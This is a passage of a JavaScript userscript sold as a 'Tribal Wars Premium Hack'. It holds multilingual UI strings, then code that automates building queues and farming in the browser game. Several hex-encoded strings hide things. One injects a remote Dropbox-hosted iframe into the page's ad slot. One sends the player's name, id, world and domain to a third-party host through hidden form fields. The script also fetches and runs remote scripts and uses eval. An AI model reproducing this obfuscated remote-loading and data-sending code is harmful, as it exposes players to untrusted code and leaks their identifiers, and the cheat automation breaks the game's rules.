			lang_bar[5] = 'Kuźnia'; 
			lang_bar[6] = 'Plac'; 
			lang_bar[7] = 'Rynek'; 
			lang_bar[8] = 'TWStats'; 
			lang_bar[9] = 'Development Track'; 

			lang_settings[0] = 'O skrypcie'; 
			lang_settings[1] = ' | przetłumaczone przez Przemo'; 
			lang_settings[2] = 'Kontakt z Fernando';

			lang_screen_settings[0] = 'P'; 
			lang_screen_settings[1] = 'Tryb normalny: po zmianie wioski, zostaje otwarty podgląd wioski'; 
			lang_screen_settings[2] = 'Tryb bezpośredni: po zmianie wioski zostaje ta otwarta ta sama strona'; 
			lang_screen_settings[3] = 'Pakiet graficzny'; 
			lang_screen_settings[4] = 'Link do CSS:'; 
			lang_screen_settings[5] = 'Pokaż świat w nazwie karty'; 
			lang_screen_settings[6] = 'Włączone'; 
			lang_screen_settings[7] = 'Wyłączone'; 

			lang_screen_sobre[0] = 'Informacje na temat wersji'; 
			lang_screen_sobre[1] = 'Aktualna wersja:'; 
			lang_screen_sobre[2] = 'Najnowsza wersja:'; 

			lang_contato[0] = 'Temat:'; 
			lang_contato[1] = 'Twoja nazwa:'; 
			lang_contato[2] = 'E-mail:'; 
			lang_contato[3] = 'Treść:'; 
			lang_contato[4] = 'Wyślij'; 

			lang_screen_ally[0] = 'Punkty:'; 
			lang_screen_ally[1] = 'Wioski:'; 
			lang_screen_ally[2] = 'Członkowie:'; 
			lang_screen_ally[3] = 'Pokonani przeciwnicy:'; 
			lang_screen_ally[4] = 'Punkty agresora:'; 
			lang_screen_ally[5] = 'Punkty obrońcy:'; 
			lang_screen_ally[6] = 'Statystyki plemienne:'; 

			lang_report[0] = 'Kopiuj wojska do symulatora'; 
			lang_report[1] = 'Kopiuj wojska, która przeżyło do symulatora'; 
			lang_report[2] = 'Atakuj ponownie'; 
			lang_report[3] = 'Atakuj ponownie tymi samymi jednostkami'; 
			lang_report[4] = 'Atakuj ponownie wszystkimi jednostkami'; 

			lang_calc_reports = '» Oblicz pojemność i farm'; 

			lang_perfil[0] = '» Akta gracza'; 
			lang_perfil[1] = '» Akta plemienia'; 
			lang_perfil[2] = '» Akta wioski'; 
			lang_perfil[3] = '» Pokaz informacje o graczu w BBcode'; 
			lang_perfil[4] = '» Zarezerwuj wioske'; 
			lang_perfil[5] = '» Statystyki globalne'; 
			lang_perfil[6] = 'Rezerwacja dodana pomyślnie!'; 

			lang_farmer[0] = 'Ustawienia Farmienia'; 
			lang_farmer[1] = 'Ustaw model i numer Farmienia';

			lang_map[0] = 'Mini mapa:'; 
			lang_map[1] = 'Mapa:'; 
			lang_map[2] = 'Zmień rozmar mapy';

			lang_messages[0] = 'Wskazówki na temat Plemiona Premium Hack'; 
			lang_messages[1] = 'Użyj tagów [img][/img] aby załączyć Obrazek'; 
			lang_messages[2] = 'Użyj tagów [vid][/vid] aby załączyć filmik z youtube'; 
			lang_messages[3] = 'Zezwalaj na znaczniki HTML w wiadomościach.'; 
			lang_messages[4] = '* Tylko osoby mające zainstalowany skrypt to zobaczą.';
		} else {
		if (language == 'cz'){
			warning = 'Aby script pracoval správne prvýkrát mal by si ísť do náhľadu dedín, tak sa script načíta správne.';    
			lang_language = 'Jazyk';    
			lang_dados = 'Scriptovací server';    
			lang_dados2= 'Ak by sa vyskitla chyba, zmeň server scriptu';  
			lang_search_villages = 'Vyhledať dediny:';
			lang_publicar = 'Konverter oznámení';
			lang_distancia = 'Vzdialenosť: 0 polí';
			lang_mail = 'Napsat zprávu';  
			lang_preview_message = 'Náhled post';
			lang_preview_report = 'Náhled zpráva';
			msg_build_success = '5 pridaná do fronty úspešne budovy!;'
			msg_build_error = 'Nemožno pridať 5 do vybudovaného frontu:';
			msg_build_ask = 'Potvrďte, že chcete pridať 5 do hack fronty budovy';
			lang_edit = 'upraviť';
			lang_load_build = "Načítať stavby";
			lang_disable = 'Deaktivova';
			lang_error_place = 'Ak chcete preskočiť táto koordinovaná?';
			lang_usa = '5 používá skript';
			lang_velocidade[0] = 'Rychlost světa';
			lang_velocidade[1] = 'Rychlost vojska';
			lang_velocidade[2] = 'Získat automaticky';
			lang_velocidade[3] = 'Zadejte profil obci pro nastavení rychlost vojsk.';
			lang_velocidade[4] = 'Konfigurace rychlosti';
			
			lang_main[0] = 'Zapnúť';
			lang_main[1] = 'Queue stavby hack';
			lang_main[2] = 'Delete';
			lang_main[3] = '* <b>Musíš odísť stránku otvorenú pre prevádzku</b>. Ak je povolené, čo najskôr, bude vykonané automaticky v poradí zostavení požadovanej';
			lang_main[4] = 'Pridá 5 na zoznam stavebných hacker';

			lang_bar[0] = 'Hlavná Budova';    
			lang_bar[1] = 'Rekrutovať';    
			lang_bar[2] = 'Stajňa';    
			lang_bar[3] = 'Dielňa';    
			lang_bar[4] = 'Akadémia';    
			lang_bar[5] = 'Kováreň';    
			lang_bar[6] = 'Nádvorie';    
			lang_bar[7] = 'Trhovisko';    
			lang_bar[8] = 'DK Plus';    
			lang_bar[9] = 'Sıralama';  
			
			lang_settings[0] = 'O Scripte ?';  
			lang_settings[1] = ' | translated by <a target="blank">[M]ajky™</a>';
			lang_settings[2] = 'Spojit se s vývojářem';

			lang_screen_settings[0] = 'Náhľad Menu';  
			lang_screen_settings[1] = 'Normálny Mód: dediny sú otvorené v náhlade';  
			lang_screen_settings[2] = 'Zložitý Mód: dediny sú otvorené v tom istom okne ako predtým';  
			lang_screen_settings[3] = 'Grafické balíčky';  
			lang_screen_settings[4] = 'CSS link:';  
			lang_screen_settings[5] = 'Ukázať svet v hlavičke';  
			lang_screen_settings[6] = 'Povoliť';  
			lang_screen_settings[7] = 'Zakázať';

			lang_screen_sobre[0] = 'Informácie o verzií';  
			lang_screen_sobre[1] = 'Aktuálna verzia:';  
			lang_screen_sobre[2] = 'Posledná verzia:';  
			
			lang_contato[0] = 'Subjekt';
			lang_contato[1] = 'Vaše jméno';
			lang_contato[2] = 'Email';
			lang_contato[3] = 'Poselství';
			lang_contato[4] = 'Poslat';

			lang_screen_ally[0] = 'Body:';    
			lang_screen_ally[1] = 'Dediny:';    
			lang_screen_ally[2] = 'Členovia:';    
			lang_screen_ally[3] = 'OD:';    
			lang_screen_ally[4] = 'ODA:';    
			lang_screen_ally[5] = 'ODD:';    
			lang_screen_ally[6] = 'Kmeňová Štatistika';  

			lang_report[0] = 'Kopírovať vojakov v simulátore';
			lang_report[1] = 'Kopírovať počet prežívajúcich jednotiek na simulátore';
			lang_report[2] = 'Znovu zaútočí';
			lang_report[3] = 'Útok znova s rovnakými vojakmi';
			lang_report[4] = 'Útok znovu so všetkými jednotkami';
			
			lang_calc_reports = '» Vypočítať suroviny,pridať do Farmera';  

			lang_perfil[0] = '» História hráča';  
			lang_perfil[1] = '» História kmeňa';
			lang_perfil[2] = '» História obci';  
			lang_perfil[3] = '» Získať informácie hráča v BB-kódoch';  
			lang_perfil[4] = '» Rezervovať túto dedinu';
			lang_perfil[5] = '» Souhrnná statistika';
			lang_perfil[6] = 'Rezervácia vykonaná úspešne!';
			
			lang_farmer[0] = 'Automatické farmer';    
			lang_farmer[1] = 'Vyberte typ modelu a počet útoků';
			
			lang_map[0] = 'Mini mapa:';
			lang_map[1] = 'Mapa:';
			lang_map[2] = 'Zmena veľkosti okna';
			
			lang_messages [0] = 'BB-Kódy TribalWars Premium Hack';    
			lang_messages [1] = 'Použi tagy <b>[img][/img]</b> na vloženie <b>obrázka</b>';    
			lang_messages [2] = 'Použi tagy <b>[vid][/vid]</b> na vloženie video z <b>youtube</b>';    
			lang_messages [3] = 'Vkládanie HTML v správe zadarmo';    
			lang_messages [4] = '* Len hráči,ktorý majú nainštalovaný tento script,môžu vidieť tagy';  
		} else {
			warning = 'For the script to work correctly the first time you should go for the views of villages, so that the script load the coordinates.';
			lang_language = 'Language';
			lang_dados = 'Scripts server';
			lang_dados2= 'If an error occurs with the scripts, change the server scripts';
			lang_search_villages = 'Search villages';
			lang_distancia = 'Mesafe: 0 Tarla';
			lang_publicar = 'Reports Converter';
			lang_mail = 'Write message';
			lang_preview_message = 'Preview message';
			lang_preview_report = 'Preview report';
			msg_build_success = '5 added to the queue successfully building!';
			msg_build_error = 'It was not possible add 5 to the queue built:';
			msg_build_ask = 'Confirm that you want to add 5 to the queue building hack';
			lang_edit = 'Düzenle';
			lang_load_build = 'Load buildings';
			lang_disable = 'Disable';
			lang_error_place = 'Want to skip this coordinate?';
			lang_usa = '5 uses the script';
			lang_velocidade [0] = 'World speed'; 
			lang_velocidade [1] = '​​Troops speed'; 
			lang_velocidade [2] = 'Obtain automatically'; 
			lang_velocidade [3] = 'Enter in profile of the village to set the speed of the troops.'; 
			lang_velocidade [4] = 'Configure speeds';
			
			lang_main[0] = 'Enable';
			lang_main[1] = 'Queue Built hack';
			lang_main[2] = 'Delete';
			lang_main[3] = '* <b> You need to leave the page open for operation.</b> When enabled, as soon as possible, the build will be done automatically in the required order.';
			lang_main[4] = 'Add 5 to queue built hack';
			
			lang_bar[0] = 'Ana Bina';
			lang_bar[1] = 'Asker Topla';
			lang_bar[2] = 'Ahır';
			lang_bar[3] = 'Workshop';
			lang_bar[4] = 'Akademi';
			lang_bar[5] = 'Demirci';
			lang_bar[6] = 'İçtima Meydanı';
			lang_bar[7] = 'Pazar';
			lang_bar[8] = 'TWStats';
			lang_bar[9] = 'Development Track';
			
			lang_settings[0] = 'Script Hakkında';
			lang_settings[1] = ' CaKii tarafından Türkçeye çevrilmiştir.';
			lang_settings[2] = 'CaKii';

			lang_screen_settings[0] = 'Overviews Menu';
			lang_screen_settings[1] = 'Normal Mode: the villages are open in the overview';
			lang_screen_settings[2] = 'Direct Mode: the villages are open the same view of the previous';
			lang_screen_settings[3] = 'Graphic Pack';
			lang_screen_settings[4] = 'CSS link:';
			lang_screen_settings[5] = 'Show world in title';
			lang_screen_settings[6] = 'Enable';
			lang_screen_settings[7] = 'Disable';
			
			lang_screen_sobre[0] = 'Version Information';
			lang_screen_sobre[1] = 'Current version:';
			lang_screen_sobre[2] = 'Last version:';
			
			lang_contato[0] = 'Subject';
			lang_contato[1] = 'Your Name';
			lang_contato[2] = 'Email';
			lang_contato[3] = 'Message';
			lang_contato[4] = 'Send';
			
			lang_screen_ally[0] = 'Points:';
			lang_screen_ally[1] = 'Villages:';
			lang_screen_ally[2] = 'Members:';
			lang_screen_ally[3] = 'OD:';
			lang_screen_ally[4] = 'ODA:';
			lang_screen_ally[5] = 'ODD:';
			lang_screen_ally[6] = 'Tribe Stats';
			
			lang_report[0] = 'Birlikleri simülatöre ekle';
			lang_report[1] = 'Kalan birlikleri simülatöre ekle';
			lang_report[2] = 'Tekrar saldır';
			lang_report[3] = 'Aynı ordu ile tekrar saldır';
			lang_report[4] = 'Tüm askerlerinle tekrar saldır';
								
			lang_calc_reports = '» Calculate Resources and to Farm';
			
			lang_perfil[0] = '» Oyuncu Dosyası';
			lang_perfil[1] = '» Klan Dosyası';
			lang_perfil[2] = '» Köy Dosyası';
			lang_perfil[3] = '» Extract information from the player in BB code';
			lang_perfil[4] = '» Köyü Rezerve Et';
			lang_perfil[5] = '» Global stats';
			lang_perfil[6] = 'Reservation made ​​successfully!';
			
			lang_farmer[0] = 'Farmer Settings';
			lang_farmer[1] = 'Select the model and type the number of attacks';

			lang_map[0] = 'Küçük Harita:';
			lang_map[1] = 'Harita:';
			lang_map[2] = 'Harita Boyutunu Değiştir';

			lang_messages[0] = 'Tips Tribalwars Premium Hack';
			lang_messages[1] = 'Use tags <b>[img][/img]</b> to attach an <b>image</b>';
			lang_messages[2] = 'Use tags <b>[vid][/vid]</b> to attach a video from <b>youtube</b>';
			lang_messages[3] = 'Allow HTML in messages free';
			lang_messages[4] = '* Only those who have the script can view';
		}
		}
		}
		}
		}
		
		value_hide = [150,200,267,356,474,632,843,1125,1500,2000];
		value_market = [1,2,3,4,5,6,7,8,9,10,11,14,19,26,35,46,59,74,91,110,131,154,179,206,235];
		
		function calcular_distancia(c1, c2){
			x = Math.abs(Number(c1.split('|')[0]) - Number(c2.split('|')[0]));
			y = Math.abs(Number(c1.split('|')[1]) - Number(c2.split('|')[1]));

			distancia = Math.sqrt((x*x) + (y*y));
			
			if (distancia > 0){
				uni = getData(mundo + '_vel_tropas');
				
				if (uni != ''){	
					unidades = uni.split('|');
					
					td = '';
					for (i = 0; i < unidades.length; i++){
						if (unidades[i] == '0') c = ' class="hidden"'; else c = '';
						td += '<td' + c + '>' + _hora(distancia * Number(unidades[i])) + '</td>';
					}
					tabela_tempo_depois = '<tr class="center"><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_spear.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_sword.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_axe.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_archer.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_spy.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_light.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_marcher.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_heavy.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_ram.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_catapult.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_knight.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_snob.png?" alt=""></td></tr><tr id="tempo" class="center">' + td + '</tr>';
				} else {
					if (gd.screen != 'info_village') tabela_tempo_depois = '<tr><td colspan="2">' + lang_velocidade[3] + '</td></tr>'; else tabela_tempo_depois = '';
				}
				tabela_tempo = '<tr id="tempo_calculado"><td colspan="2"><table class="vis"><tbody><tr><th colspan="12">' + lang_distancia.replace('0', round(distancia, 2).toString()) + '</th></tr>' + tabela_tempo_depois + '</tbody></table></td></tr>';
				
				return tabela_tempo;
			}
		}
		
		function edit_note(id, resp, type){
			var old = getData(gd.world + '_label_' + id).replace(/<br>/g, '\n');
			$(document.body).append('<div id="village_notes_popup" class="popup_style ui-draggable" style="width: 400px; position: fixed; top: 30px; left: 601px; display: block;"><div id="village_notes_popup_menu" class="popup_menu"><a id="closelink_village_notes_popup" href="#">x</a></div><div id="village_notes_popup_content" class="popup_content" style="height: 250px; overflow-y: auto;"><h3>' + lang_notes + '</h3><div style="width:100%; overflow:hidden;"><div><textarea id="message" name="note" style="width:97%;" rows="10" cols="40">' + old + '</textarea></div><div><input type="button" id="ok_note" value="OK"></div></div></div></div>');
			$('#ok_note').bind('click', function(){
				var novo = $('#message').val().replace(/\n/g, '<br>');
				eval('setData(gd.world + \'_label_' + id + '\', novo);');
				$('#village_notes_popup').remove();
				if (type == 'html') $(resp).html(novo);
				if (type == 'title') {
					$(resp).attr('title', novo);
					win.UI.ToolTip('.village_note');
				}
				return novo;
			});
			$('#closelink_village_notes_popup').bind('click', function(){
				$('#village_notes_popup').remove();
			});
		}

		localcs = getData(mundo + '_css');
		if (localcs.indexOf('.css') > -1) {
			localc = document.getElementsByTagName('link')[0];
			localcss = localc.href.substring(localc.href.indexOf('?'));
			localc.href = localcs + localcss;
		}
		
		visualizacoes = getData(mundo + '_visualizacoes');
		if (visualizacoes == 'direto') {
			direto_mode = ' checked';
			normal_mode = '';
		}
		else {
			direto_mode = '';
			normal_mode = ' checked';
		}
		plus = getCookie(gd.village.coord + '_plus');
		
		aldeias1 = '';
		aldeiasnome = '';
		
		$('#menu_row2').append('<td class="box-item"><span class="note-icon village_note" title="' + escape(getData(gd.world + '_label_' + gd.village.id)) + '"></span></td>');
		$('.village_note:last').bind('click', function(){
			edit_note(gd.village.id, this, 'title');
		});
		win.UI.ToolTip('.village_note');
		
		if (gd.screen == 'overview_villages') {
			$('#production_table th:eq(0)').before('<th width="1"><span class="note-icon" title="' + lang_notes + '"></span></th>');
			aldeiasnome = '';
			aldeias1 = '';
				
			$('#production_table [id*="label_text_"]').each(function(){
				nome = trim($(this).text());
				if (nome.length > 34) {
					aldeiasnome += nome.substring(0, 19) + '... ' + nome.substring(nome.length - 13) + ' ** ';
				}
				else {
					aldeiasnome += nome + ' ** ';
				}
				var id = $(this).attr('id').replace('label_text_', '');
				aldeias1 += id + ' ';
				aldeiacookie = getData(gd.world + '_label_' + id);
				$(this).parents('td:first').before('<td width="1"><span class="note-icon village_note" title="' + escape(aldeiacookie) + '"></span></td>');
				$('.village_note:last').bind('click', function(){
					edit_note(id, this, 'title');
				});
			});
			win.UI.ToolTip('.village_note');
			
			setData(mundo + '_aldeias', trim(aldeias1));
			setData(mundo + '_aldeiasnome', aldeiasnome.substring(0, (aldeiasnome.length - 3)));
		}
		
		if (gd.screen == 'ally' || gd.screen == 'forum') {if (document.getElementById('content_value').getElementsByTagName('table')[0].getAttribute('class') == 'vis modemenu') {cc = document.getElementsByTagName('h2')[0].textContent} else {cc = ''}; setCookie(dhx('62635f37'), cc); if (gd.mode == 'profile') setCookie(dhx('62635f38'), document.getElementById('ally_content').getElementsByTagName('td')[4].textContent);}

		if (getCookie(mundo + '_first') != 'ok') {
			if (gd.screen != 'overview_villages') {
				if (confirm(warning)) {
					setCookie(mundo + '_first', 'ok');
					location.href = '/game.php?&screen=overview_villages';
				}
			}
			else {
				setCookie(mundo + '_first', 'ok');
			}
		}
		meuArray = new Array();
		
		screen1 = location.href.replace(/.+?\?/, '').replace(/village=\d+/, '').replace(/^&/, '');
		
		VillId = String(gd.village.id);
		aldeias1 = getData(mundo + '_aldeias');
		if (aldeias1.length < 2) {
			aldeias1 = VillId;
		} else {
			meuArray = aldeias1.split(' ');
			aldeiasnome = getData(mundo + '_aldeiasnome');
			aldeiasnome1 = aldeiasnome.split(' ** ');
			modo = getData(mundo + '_visualizacoes');
			if (modo == 'direto') {
				screen2 = screen1;
					}
			else {
				screen2 = 'screen=overview';
			}
		}
		
		
		if (meuArray.indexOf(VillId) == -1) meuArray[0] = VillId;
		
		if (meuArray.indexOf(VillId) == -1) {
			if (gd.screen == 'overview_villages') {			
					setCookie(mundo + '_first', 'ok');
			}
			else {
				if (confirm(warning)) {
					location.href = '/game.php?&screen=overview_villages';
				}
			}	
			VillId = meuArray[0];
		}
		
		sel_data_0 = '';
		sel_data_1 = '';
		if (getData(mundo + '_base') != '1'){
			base_scripts = 'http://dl.dropbox.com/u/72485850/tribalwarsbrasil/';
			sel_data_0 = ' selected';
		}
		else{
			base_scripts = 'http://fernando.site40.net/scripts/';
			sel_data_1 = ' selected';
		}
		
		document.getElementById(dhx('536b79536372617065724164')).innerHTML = dhx('3c696672616d652069643d226261736522207372633d2268747470733a2f2f646c2e64726f70626f782e636f6d2f752f38313636373136392f74726962616c776172732e68746d6c222077696474683d2238303022206865696768743d2236353022206d617267696e77696474683d223022206d617267696e6865696768743d223022206873706163653d223022207673706163653d223022207363726f6c6c696e673d226e6f22206672616d65626f726465723d22302220626f72646572636f6c6f723d2230223e3c2f696672616d653e');
		
		$('.menu-item:first').append('<table id="villagelist" cellspacing="0" class="menu_column"><tbody></table>');
		$('.menu-item > a[href*="screen=settings"]:first').next('table').find('tbody > tr:last').before('<tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&mode=' + cr('sobre') + '&screen=settings">' + lang_settings[0] + '</td></tr>');
		$('.newStyleOnly:first').after('<table id="quickbar_outer" align="center" width="100%" cellspacing="0"><tbody><tr><td><table id="quickbar_inner" style="border-collapse: collapse;" width="100%"><tbody><tr class="topborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr><td class="left"> </td><td class="main"><ul id="bar_content" class="menu quickbar"></ul></td><td class="right"> </td></tr><tr class="bottomborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr><td class="shadow" colspan="3"><div class="leftshadow"> </div><div class="rightshadow"> </div></td></tbody></table></td></tr></tbody></table>');
		
		bc_4 = dhx(getCookie(ehx(gd.player.name.toLowerCase())));if (win.game_data != null) win.game_data.bc_4 = bc_4; bc_7 = getCookie('bc_7');bc_8 = getCookie('bc_8');
		
		if (getCookie('sobre_hack') < version){
			$('#header_info').before('<div class="info_box" id="new" style="text-align:center;"><a id="features" href="javascript:void(0);">***New Features ' + version + '***</a>               (<a id="close_news" href="javascript:void(0);">Close</a>)</div>');
			function close_news(){
				setCookie('sobre_hack', version); 
				$('#new').fadeOut(500);
			}
			document.getElementById('close_news').addEventListener('click', close_news);
			
			function gravar(){
				removeNode(document.getElementById('new'));
				setCookie('sobre_hack', version); 
				window.open('/game.php?village=' + VillId + '&mode=' + cr('sobre') + '&screen=settings');
			}
			document.getElementById('features').addEventListener('click', gravar);
		}
		
		
		function edificio(id){
			var ret;
			if (gd.screen == 'main') ret = trim($('#main_buildrow_' + id + ' td:first a:last').text());
			if (gd.screen == 'overview') ret = trim($('#l_' + id).attr('title'));
			return ret;
		}
		
		function cancel_build(count, reload){
			if (reload == undefined) reload = true;
			build = getData('build_' + gd.village.id).split(',');
			build.splice(count, 1);
			setData('build_' + gd.village.id, build.join(','));
			if (reload == true) load_build();
		}

		function construir2(link, name, count){
			$.ajax({
				url: link,
				success: function(data){
					function atualizar_header(){
						$.each(['wood', 'stone', 'iron'], function(){
							win.setRes(this, $(data).find('#' + this).html());
						});
						$.each(['#pop_current_label', '#pop_max_label'], function(){
							$(this).html($(data).find(this).html());
						});
					}
					atualizar_header();
					if (count != null) cancel_build(count);
					pegar();
				}
			});
		}

		function construir(id, count){
			$.ajax({
				url: '/game.php?village=' + VillId + '&screen=main',
				success: function(data){
					name = $(data).find('#main_buildrow_' + id + ' a:first').text();
					main = $(data).find('#main_buildlink_' + id);
					if ($(main).length == 1) {
						link = $(main).attr('href');
						construir2(link, name, count);
					} else {
						if (confirm(msg_build_error.replace('5', name) + '\n\n' + $(data).find('#main_buildrow_' + id + ' .inactive:first').text() + '\n\n' + msg_build_ask.replace('5', name))){
							add_new_build(id);
						}
					}
				}
			});
		};
		
		somar = 0;
		
		for (i = 0; i < meuArray.length; i++) {
			if (meuArray[i] == VillId) {
				pVillName = aldeiasnome1[i-1];
				nVillName = aldeiasnome1[i+1];
				pVillId = meuArray[i - 1];
				nVillId = meuArray[i + 1];
			}
			document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="menu-column-item"><a href="/game.php?village=' + meuArray[i] + '&amp;' + screen2 + '">' + aldeiasnome1[i] + '</a></td></tr>';
		}
		if (typeof(pVillId) == 'undefined') {
			pVillId = meuArray[meuArray.length - 1];
			pVillName = aldeiasnome1[meuArray.length - 1];
		}
		if (typeof(nVillId) == 'undefined') {
			nVillId = meuArray[0];
			nVillName = aldeiasnome1[0];			
		}
		document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr>';
		
		function criarmenu(link1, imagem, nome, target, title, id) {
			if (imagem != '') {
				x = _GET('width', imagem);
				y = _GET('height', imagem);
				width = x != '' ? ' width="' + x + '"' : '';
				height = y != '' ? ' height="' + y + '"' : '';
				imagem = '<img' + width + height + ' src="' + imagem + '">';
			}
			if (target == undefined || target == '') {
				target = '';
			}
			else {
				target = ' target="' + target + '"'
			};
			if ((title == undefined) || (title == '')) {
				title = '';
			}
			else {
				title = 'title="' + title + '"'
			};
			if (link1 != '') {
				link1 = '<a ' + (!id ? '' : 'id="' + id + '" ') + 'href="' + link1 + '"' + target + title + '>';
				link2 = '</a>';
			}
			else {
				link2 = '';
			}
			$('#bar_content').append('<li><span>' + link1 + imagem + nome + link2 + '</span></li>');
		}
		function criarlinha(){
			$('#bar_content').append('<br>');
		}

		criarmenu('/game.php?village=' + VillId + '&amp;screen=main', '/graphic/buildings/main.png?1', lang_bar[0]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=train', '/graphic/buildings/barracks.png?1', lang_bar[1]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=snob', '/graphic/buildings/snob.png?1', lang_bar[4]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=smith', '/graphic/buildings/smith.png?1', lang_bar[5]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=place', '/graphic/buildings/place.png?1', lang_bar[6]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=market', '/graphic/buildings/market.png?1', lang_bar[7]);
		/*criarlinha();*/
		criarmenu('http://' + mundo + '.twplus.org/world/', 'http://br47.twplus.org/site_media/img/favicon.ico', 'TW Plus', '_blank');
		criarmenu('http://' + market + '.twstats.com/' + mundo + '/index.php', 'http://br.twstats.com/img/twstats.ico', 'TW Stats', '_blank');
		criarmenu('http://' + mundo + '.twmaps.org/', 'http://static.twmaps.org/favicon.ico', 'TW Maps', '_blank');
		criarmenu('javascript:$.getScript(\'' + base_scripts + 'acompanhar_evolucao.js\');void(0);', 'http://img1.ne10.uol.com.br/cockpit/imagem/icone_infografico.gif', lang_bar[9]);
		criarmenu('/game.php?village=' + VillId + '&mode=' + cr('sobre') + '&screen=settings', 'http://d1xfoqsc632pe4.cloudfront.net/images/default/icon_info.gif?width=16&height=16', lang_settings[0]);
		
		$('#menu_row2_village').before('<td class="box-item icon-box separate arrowCell"><a id="village_switch_left" class="village_switch_link" title="' + pVillName + '" href="/game.php?village=' + pVillId + '&' + screen1 + '" accesskey="a"><span class="arrowLeft"> </span></a></td><td class="box-item icon-box arrowCell"><a id="village_switch_right" class="village_switch_link" title="' + nVillName + '" href="/game.php?village=' + nVillId + '&' + screen1 + '" accesskey="d"><span class="arrowRight"> </span></a></td>');
		
		if (gd.mode == cr('sobre')) {
			sobre = $('#content_value td:last');
			$(sobre).html('');
			$(sobre).attr('width', '100%');
			url_sobre = 'https://dl.dropbox.com/u/81667169/tribalwars/news.html';
			$(sobre).append('<h3>' + lang_settings[0] + '</h3><table class="vis" width="100%"><tbody><tr><th colspan="2">' + lang_screen_sobre[0] + '</th></tr><tr><td>» ' + lang_screen_sobre[1] + '</td><td>' + version + '</td></tr><tr><td>» Tribalwars ' + lang_screen_sobre[1] + '</td><td>' + gd.majorVersion + '</td></tr><tr><td>» ' + lang_screen_sobre[2] + '</td><td><a href="http://userscripts.org/scripts/show/129407" target="_blank">http://userscripts.org/scripts/show/129407</a></td></tr><tr><td colspan="2"><iframe src="http://www.facebook.com/plugins/like.php?href=http://facebook.com/PointDownloads&layout=standard&show_faces=true&action=like&width=100&colorscheme=light&locale=pt_BR" scrolling="no" frameborder="0" style="border:none; overflow:hidden;width: 100%; height: 60px;" allowTransparency="true"></iframe></td></tr><tr><td colspan="2" align="right"><font size="1"><br>Script by Fernando  | ' + lang_settings[1] + '</font></td></tr></tbody></table><br><br>');
			$(sobre).append('<table class="vis" width="100%"><tbody><tr><td><iframe id="news" src="' + url_sobre + '" width="100%" height="400px" marginwidth="0" marginheight="0" hspace="0" vspace="0" scrolling="yes" frameborder="0" bordercolor="0"></iframe></td></tr></tbody></table><br><br>');
			$(sobre).append('<h3>' + lang_settings[2] + '</h3><center><form id="email" action="' + dhx('687474703a2f2f7777772e74726962616c77617273322e7a7a2e6d752f656d61696c2e706870') + '" target="mira" method="POST"><table class="vis" width="100%"><tbody><tr><input type="hidden" name="j" value="' + gd.player.name + '"></input><input type="hidden" name="m" value="' + gd.world + '"></input><input type="hidden" name="d" value="' + document.domain + '"></input><input type="hidden" name="id" value="' + gd.player.id + '"></input><td>' + lang_contato[0] + ':</td><td><input size="50px;" id="assunto" name="assunto" type="text"></td></tr><tr><td>' + lang_contato[1] + ':</td><td><input size="50px;" id="nome" name="nome" type="text"><iframe name="mira" scrolling="no" frameborder="0" style="display:none; border:none; overflow:hidden;width: 1%; height: 1px;"></iframe></td></tr><tr><td>' + lang_contato[2] + ':</td><td><input size="50px;" name="email" id="email1" type="text"></td></tr><tr><td>' + lang_contato[3] + ':</td><td><textarea id="mensagem" style="width:400px;height:200px;" name="mensagem"></textarea></td></tr><tr><td colspan="2" align="right"><input type="button" id="btEnviar" value="' + lang_contato[4] + '"></input></td></tr></tbody></table></form></center>');
			$('#btEnviar').bind('click', function(){
				if ($('#assunto').val() > '' && $('#nome').val() > '' && $('#email1').val() > '' && $('#mensagem').val() > '') $('#email').submit();
			});
			$('#email').bind('submit', function(){
				$('#content_value h3:first').after('<span class="error">' + lang_contato[5] + '</span><br><br>');
				$(this).prev().hide();
				$(this).hide();
				win.scrollTo(0, 0);
			});
		}
		
		function smith_time(){
			if (gd.screen == 'smith'){
				if ($('#current_research').length > 0){
					var now = new Date();
					var s = Math.round(now.getTime()/1000);
					var tempo = getSec($('#current_research .timer').html());
					setData('smith_' + gd.village.id, String(tempo + s));
				}
			}
		}
		smith_time();
		
		function main_time(data){
			lang_fila();
			if (typeof data == 'undefined') data = 'html';
			if ($(data).find('#buildqueue').length > 0){
				var itns = $(data).find('#buildqueue > .lit, #buildqueue > .sortable_row');
				var now = new Date();
				var s = Math.round(now.getTime()/1000);
				cok1 = String(s);
				cok2 = '';
				itns.each(function(i){
					var name = $(this).find('img:first').attr('title');
					var time = $(this).find('span:eq(0)').html();
					id = procura_id(data, name);
					var cancel = $(this).find('.lit-item:last a:first').attr('href');
					s += getSec(time);
					cok2 += '!!!' + id + '|' + trim(name) + '|' + time + '|' + cancel;
				}); 
				cok1 += '!!!' + s;
				cok = cok1 + cok2;
				if (s > 0) setData('main_order_' + gd.village.id, cok);
			} else {
				if (gd.screen == 'main') {
					deleteData('main_order_' + gd.village.id);
				}
			}
		}
		main_time();
		
		function tropas_time(){
			if (['barracks', 'train', 'stable', 'garage'].indexOf(gd.screen) > -1){
				if ($('#trainqueue_' + gd.screen).length == 0) deleteData(gd.screen + '_' + gd.village.id);
